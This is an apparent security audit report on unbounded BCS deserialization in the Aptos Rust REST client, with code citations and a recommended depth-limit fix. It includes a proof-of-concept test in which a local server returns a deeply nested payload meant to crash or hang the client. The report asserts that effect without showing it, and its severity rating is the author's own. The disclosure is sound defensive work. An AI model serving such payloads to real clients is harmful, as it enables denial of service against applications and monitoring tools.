# Audit Report

## Title
Unbounded BCS Deserialization in REST Client Enables Client-Side Denial of Service via Malicious Server Responses

## Summary
The Aptos REST client (`aptos-rest-client`) uses unbounded BCS deserialization when processing server responses, making it vulnerable to denial-of-service attacks from malicious or compromised API servers that send deeply nested or maliciously crafted BCS data structures.

## Finding Description

The Aptos codebase implements proper protection against BCS bombs on the **server side** when deserializing client requests, using `bcs::from_bytes_with_limit()` with depth constraints. However, the **REST client** uses unbounded `bcs::from_bytes()` when deserializing responses from servers, creating an asymmetric vulnerability.

**Server-Side Protection (Correct Implementation):**

The API server properly validates incoming BCS data with depth limits: [1](#0-0) [2](#0-1) 

Similarly, view functions use bounded deserialization: [3](#0-2) [4](#0-3) 

Even the network protocol layer uses limits: [5](#0-4) 

**Client-Side Vulnerability (Missing Protection):**

The REST client performs unbounded deserialization throughout: [6](#0-5) 

This retrieves all bytes from the response without size validation, then deserializes them without depth limits at multiple locations: [7](#0-6) [8](#0-7) [9](#0-8) [10](#0-9) [11](#0-10) [12](#0-11) [13](#0-12) 

And many more instances throughout the file.

**Attack Scenario:**

1. Attacker operates or compromises an Aptos fullnode/API server
2. Client application connects to this malicious server
3. Server responds to any BCS request with deeply nested structures (e.g., `Vec<Vec<Vec<Vec<...>>>>` with hundreds of nesting levels or extremely large allocations)
4. Client calls `bcs::from_bytes(&bytes)` without any depth or size limits
5. Client experiences stack overflow, memory exhaustion, or prolonged CPU consumption, resulting in denial of service

## Impact Explanation

**Severity: High**

While this vulnerability does not directly affect consensus or validator operations, it represents a significant **client-side availability and reliability issue** that could impact:

1. **Infrastructure Tooling**: If validator operators or monitoring systems use the REST client to query node status, a malicious response could disable critical monitoring
2. **SDK Users**: All applications built with the Aptos Rust SDK that connect to untrusted or compromised fullnodes are vulnerable
3. **Service Availability**: Client applications can be crashed or degraded by connecting to malicious endpoints

This falls under the **High Severity** category as it enables "API crashes" and represents a "significant protocol violation" where the client implementation lacks basic input validation protections that the server-side correctly implements.

## Likelihood Explanation

**Likelihood: Medium-High**

The attack is highly feasible:
- **Attacker Requirements**: Minimal - only requires operating a malicious fullnode or compromising an existing one
- **Technical Complexity**: Low - crafting deeply nested BCS structures is straightforward
- **Detection**: Difficult - appears as legitimate API responses until deserialization fails
- **Prevalence**: Any client application connecting to untrusted fullnodes is at risk

The asymmetry between server-side protection and client-side vulnerability suggests this was an oversight rather than an intentional design decision.

## Recommendation

Replace all instances of unbounded `bcs::from_bytes()` with `bcs::from_bytes_with_limit()` in the REST client. Use the same depth limits already established for server-side validation:

```rust
// In check_and_parse_bcs_response and other deserialization points:
const MAX_BCS_RESPONSE_DEPTH: usize = 16;

// Replace:
bcs::from_bytes(&inner)

// With:
bcs::from_bytes_with_limit(&inner, MAX_BCS_RESPONSE_DEPTH)
```

Specifically update:
- `check_and_parse_bcs_response()` helper function
- All direct `bcs::from_bytes()` calls in API response handling
- Consider adding size limits on response body length before deserialization

This creates symmetric protection: clients validate server responses with the same rigor that servers validate client requests.

## Proof of Concept

```rust
// PoC: Malicious server sends deeply nested Vec response
use aptos_rest_client::Client;
use std::net::TcpListener;
use warp::Filter;

#[tokio::test]
async fn test_bcs_bomb_attack() {
    // Create malicious BCS payload with excessive nesting
    // Vec<Vec<Vec<Vec<...>>>> with 100+ levels
    let mut malicious_bcs = vec![0x01]; // Vec with 1 element
    for _ in 0..100 {
        let mut nested = vec![0x01]; // Another vec with 1 element
        nested.extend_from_slice(&malicious_bcs);
        malicious_bcs = nested;
    }
    
    // Malicious server returns this when queried
    let routes = warp::path!("v1" / "accounts" / String / "resources")
        .map(move |_addr| {
            warp::reply::with_header(
                malicious_bcs.clone(),
                "content-type",
                "application/x-bcs"
            )
        });
    
    let server = warp::serve(routes).bind(([127, 0, 0, 1], 8080));
    tokio::spawn(server);
    
    // Client attempts to deserialize - will crash/hang
    let client = Client::new("http://127.0.0.1:8080".parse().unwrap());
    let result = client.get_account_resources_bcs(
        "0x1".parse().unwrap()
    ).await;
    
    // This will fail due to stack overflow or excessive memory allocation
    assert!(result.is_err());
}
```

**Notes**

The vulnerability stems from an implementation inconsistency where server-side input validation properly uses bounded deserialization while client-side response handling does not. This creates a trust boundary violation where clients implicitly trust server responses to be well-formed, despite servers being untrusted in a decentralized network context. The fix is straightforward: apply the same depth limits used for server-side validation to client-side deserialization.

### Citations

**File:** api/src/transactions.rs (L851-851)
```rust
    const MAX_SIGNED_TRANSACTION_DEPTH: usize = 16;
```

**File:** api/src/transactions.rs (L1224-1224)
```rust
                    bcs::from_bytes_with_limit(&data.0, Self::MAX_SIGNED_TRANSACTION_DEPTH)
```

**File:** api/types/src/move_types.rs (L688-688)
```rust
pub const MAX_RECURSIVE_TYPES_ALLOWED: u8 = 8;
```

**File:** api/src/view_function.rs (L127-127)
```rust
            bcs::from_bytes_with_limit(data.0.as_slice(), MAX_RECURSIVE_TYPES_ALLOWED as usize)
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L260-261)
```rust
    fn bcs_decode<T: DeserializeOwned>(&self, bytes: &[u8], limit: usize) -> anyhow::Result<T> {
        bcs::from_bytes_with_limit(bytes, limit).map_err(|e| anyhow!("{:?}", e))
```

**File:** crates/aptos-rest-client/src/lib.rs (L194-194)
```rust
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L393-393)
```rust
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L459-459)
```rust
        Ok(response.and_then(|bytes| bcs::from_bytes(&bytes))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L544-544)
```rust
        Ok(response.and_then(|bytes| bcs::from_bytes(&bytes))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L1008-1008)
```rust
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L1040-1040)
```rust
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L1220-1220)
```rust
        Ok(response.and_then(|inner| bcs::from_bytes(&inner))?)
```

**File:** crates/aptos-rest-client/src/lib.rs (L1773-1779)
```rust
    async fn check_and_parse_bcs_response(
        &self,
        response: reqwest::Response,
    ) -> AptosResult<Response<bytes::Bytes>> {
        let (response, state) = self.check_response(response).await?;
        Ok(Response::new(response.bytes().await?, state))
    }
```
